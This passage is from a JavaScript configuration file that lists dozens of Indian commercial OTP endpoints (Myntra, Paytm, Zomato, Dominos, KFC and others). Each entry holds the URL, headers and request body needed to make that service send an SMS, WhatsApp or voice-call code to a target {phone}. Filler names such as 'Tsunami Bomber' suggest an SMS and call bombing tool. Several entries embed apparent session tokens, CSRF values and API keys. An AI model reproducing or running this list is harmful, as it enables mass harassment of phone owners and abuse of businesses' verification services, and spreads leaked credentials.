            "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*",
            "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },
    {
        name: "SmartCoin_SMS",
        method: "POST",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "Ullu_Aashu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "Host": "ullu.app",
            "Origin": "https://ullu.app",
            "Referer": "https://ullu.app/"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "Myntra_WA",
        method: "POST",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" })
    },
    {
        name: "MediBuddy_WA",
        method: "POST",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow" })
    },
    {
        name: "Hungama_Verified",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
    },
    {
        name: "Netmeds_Aashu",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "Host": "m.netmeds.com",
            "Referer": "https://m.netmeds.com/customer/account/login"
        }
    },
    {
        name: "Smytten", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST", headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" })
    },
    {
        name: "MedPlus",
        method: "POST",
        url: "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
        headers: {
            "accept": "application/json, text/plain, */*",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.medplusmart.com",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false" }
    },
    {
        name: "Paytm",
        method: "POST",
        url: "https://accounts.paytm.com/v2/api/register",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://accounts.paytm.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Content-Type": "application/json",
            "Referer": "https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        data: { "email": "", "mobile": "{phone}", "loginPassword": "Pura@1090", "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d", "redirectUri": "https://paytm.com/v1/api/authresponse", "clientId": "paytm-web-secure", "scope": "paytm", "state": "", "responseType": "code", "theme": "mp-html5", "dob_agreement": true }
    },
    {
        name: "Byjus",
        method: "POST",
        url: "https://bcas-prod.byjusweb.com/api/send-otp",
        headers: {
            "accept": "*/*",
            "origin": "https://byjus.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        data: { "_raw": "phoneNumber={phone}&page=free-trial-classes" }
    },
    {
        name: "OYO_WA",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: { "Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;" },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 })
    },
    {
        name: "Coolwinks",
        method: "GET",
        url: "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
        headers: {
            "Accept": "*/*",
            "x-user-agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 CWUA/msite/0/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Origin": "https://www.coolwinks.com",
            "Referer": "https://www.coolwinks.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        }
    },
    {
        name: "Servetel_Verified",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)" },
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "Quikr_Aashu",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "Host": "www.quikr.com",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Origin": "https://www.quikr.com",
            "Referer": "https://www.quikr.com/SignIn"
        },
        data: { "_raw": "user={phone}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&v3=true" }
    },
    {
        name: "Voot_1",
        method: "POST",
        url: "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.voot.com",
            "referer": "https://www.voot.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "type": "mobile", "mobile": "{phone}", "countryCode": "+91" }
    },
    {
        name: "Udaan", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://auth.udaan.com", "x-app-id": "udaan-auth" },
        data: { "_raw": "mobile={phone}" }, rateLimit: true
    },
    {
        name: "Myntra",
        url: "https://www.myntra.com/gateway/v1/auth/getotp", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" })
    },
    {
        name: "Dream11_2",
        method: "POST",
        url: "https://www.dream11.com/graphql/mutation/pwa/register",
        headers: {
            "accept": "*/*",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register?testcode=affpwa2&utm_source=VcomIndWeb&utm_medium=cpr&utm_campaign=98885&utm_content=20200919",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": { "email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia" } }
    },
    {
        name: "EasyMyTrip",
        method: "POST",
        url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        headers: {
            "accept": "text/plain, */*; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://mybookings.easemytrip.com",
            "referer": "https://mybookings.easemytrip.com/MyBooking/Profile",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "emailph": "{phone}" }
    },
    {
        name: "Ogonn_Aashu",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "Host": "ogonn.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ogonn.in",
            "Referer": "https://ogonn.in/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "Zepto_WA",
        method: "POST",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" })
    },
    {
        name: "AngelBroking",
        method: "POST",
        url: "https://www.angelbroking.com/form-gateways/oda-form.php",
        headers: {
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
            "origin": "https://www.angelbroking.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "referer": "https://www.angelbroking.com/open-demat-account",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "name=Tsunami+Bomber&mobile={phone}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752" }
    },
    {
        name: "Zepto Voice",
        url: "https://zepto.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Lenskart_1",
        method: "POST",
        url: "https://api.lenskart.com/v2/customers/sendOtp",
        headers: {
            "origin": "https://www.lenskart.com",
            "x-b3-traceid": "991600776345288",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
            "cache-control": "no-cache, no-store",
            "x-session-token": "3bcac6f3-bda5-4370-8dc1-eebd8274b399",
            "x-api-client": "mobilesite",
            "referer": "https://www.lenskart.com/customer/account/login",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        data: { "telephone": "{phone}" }
    },
    {
        name: "RoyalChallengers", url: "https://shop.royalchallengers.com/api/customer/login",
        method: "POST",
        headers: { "Content-Type": "application/json", "user-agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" })
    },
    {
        name: "JioSaavn_NEW", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Dominos",
        method: "POST",
        url: "https://api.dominos.co.in/loginhandler/forgotpassword",
        headers: {
            "strict-transport-security": "max-age=1636116872593",
            "access-control-allow-methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS",
            "x-content-type-options": "nosniff",
            "api_key": "d2aeb489bb8df385",
            "ga_client_id": "559252815.1604559839",
            "status": "SUCCESS",
            "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
            "userid": "48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
            "x-forwarded-for-requestid": "1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
            "cartid": "1823648622264698",
            "source": "PWA18#upsellC",
            "isloggedin": "false",
            "client_type": "web app-chrome",
            "accesskeyid": "ASIAWMIT2NXASDYLBK5W1604559840",
            "x-frame-options": "mitigate",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "credentials": "[object Object]",
            "deliverytype": "D",
            "authtoken": "ASIAWMIT2NXASDYLBK5W1604559840",
            "access-control-allow-origin": "",
            "accept": "application/json, text/plain, */",
            "sessiontoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8",
            "content-type": "application/json",
            "access-control-allow-headers": "*",
            "storeid": "6585R",
            "ab_test_variant": "New Flow",
            "origin": "https://m.dominos.co.in",
            "referer": "https://m.dominos.co.in/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "lastName": "", "mobile": "{phone}", "firstName": "" }
    },
    {
        name: "Aakash_Aashu",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "Host": "digital.aakash.ac.in",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://digital.aakash.ac.in",
            "Referer": "https://digital.aakash.ac.in/user/register",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "Vidyakul",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "phone={phone}&rcsconsent=true" }
    },
    {
        name: "Tradgo", url: "https://tradgo.in/appapi4/Forgot_password_new/getOtp",
        method: "POST", headers: { "Content-Type": "application/json", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "BookMyShow_1",
        method: "POST",
        url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        headers: {
            "accept": "application/json",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://in.bookmyshow.com",
            "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber=9519874704&email=&source=web",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "channel": "phone", "subChannel": "sms", "details": { "phone": "{phone}", "origin": "https://in.bookmyshow.com" } }
    },
    {
        name: "55Club_WA",
        method: "POST",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "origin": "https://55club08.in", "referer": "https://55club08.in/" },
        data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 })
    },
    {
        name: "Oyo_2",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "text/plain;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        data: { "phone": "{phone}", "country_code": "+91", "nod": 4 }
    },
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "SmartCoin_Call",
        method: "POST",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "IVR", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "Breeze_WA",
        method: "POST",
        url: "https://api.breeze.in/session/start",
        headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" })
    },
    {
        name: "Vedantu",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json", "accept": "*/*", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/"
        },
        data: { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" }
    },
    {
        name: "Zomato_2",
        method: "POST",
        url: "https://www.zomato.com/webroutes/auth/login",
        headers: {
            "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.zomato.com",
            "referer": "https://www.zomato.com/kanpur",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone" }
    },
    {
        name: "Dineout",
        method: "POST",
        url: "https://www.dineout.co.in/xhrajaxrequest/user_signup",
        headers: {
            "accept": "application/json, text/javascript, /; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.dineout.co.in",
            "referer": "https://www.dineout.co.in/non-veg-special-restaurants-near-me",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={phone}" }
    },
    {
        name: "Jockey_WhatsApp", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        method: "GET",
        headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" }
    },
    {
        name: "Cilory",
        method: "POST",
        url: "https://www.cilory.com/app/w/auth/soft",
        headers: {
            "accept": "application/json",
            "origin": "https://www.cilory.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json;charset=UTF-8",
            "referer": "https://www.cilory.com/authentication?back=%2Fmy-account",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        data: { "mobile": "{phone}" }
    },
    {
        name: "KFC",
        method: "POST",
        url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
        headers: {
            "accept": "application/json, text/plain, /",
            "__requestverificationtoken": "x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://online.kfc.co.in",
            "referer": "https://online.kfc.co.in/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "phoneNumber": "{phone}", "AuthorizedFor": "3", "Resend": "false" }
    },
    {
        name: "SabkaLoan", url: "https://api.sabkaloan.com/api/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sabkaloan.com", "Referer": "https://sabkaloan.com/" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "DamieCloud_SMS",
        method: "GET",
        url: "https://damiecloud.online/send/{phone}",
        headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" }
    },
    {
        name: "JioSaavn", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "HeroFinCorp_WA", url: "https://loans.apps.herofincorp.com/api/generateOtp", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
    },
    {
        name: "Breeze Session",
        url: "https://api.breeze.in/session/start",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "authVerificationType": "otp", "countryCode": "+91"})
    },
    {
        name: "MamaEarth_WA", url: "https://auth.mamaearth.in/v1/auth/initiate-signup", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Wrogn", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST",
        headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "origin": "https://wrogn.com", "referer": "https://wrogn.com/", "shop_name": "wrogn-website.myshopify.com" },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },
    {
        name: "Zerodha_WA",
        method: "POST",
        url: "https://zerodha.com/account/registration.php",
        headers: { "accept": "*/*", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
    },
    {
        name: "Vidyakul_WA",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Licious", url: "https://www.licious.in/api/login/signup", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.licious.in", "Referer": "https://www.licious.in/" },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "Ogonn", url: "https://ogonn.in/otp",
        method: "POST", headers: { "accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login" },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "Ullu", method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "accept": "application/json, text/plain, */*", "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/"
        },
        data: {}
    },
    {
        name: "Gokwik_4", method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
            "Content-Type": "application/json", "gk-merchant-id": "19kc37zcdyiu"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Vedantu_WA",
        method: "POST",
